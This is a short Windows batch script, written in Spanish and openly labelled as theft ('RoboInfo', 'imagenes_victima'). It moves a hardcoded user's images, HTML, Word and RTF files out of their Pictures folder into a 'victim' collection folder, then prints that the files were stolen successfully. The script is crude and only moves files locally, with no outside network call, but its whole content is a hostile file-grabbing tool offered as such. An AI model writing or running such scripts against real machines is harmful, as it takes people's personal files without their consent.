@echo off
set origen=C:\Users\Dash\Pictures
set destino=C:\Users\Dash\Desktop\RoboInfo\imagenes_victima

for %%f in ("%origen%\*.png") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.jpg") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.html") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.jfif") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.webp") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.docx") do (
    move "%%f" "%destino%"
)

for %%f in ("%origen%\*.rtf") do (
    move "%%f" "%destino%"
)

echo Archivos robados exitosamente.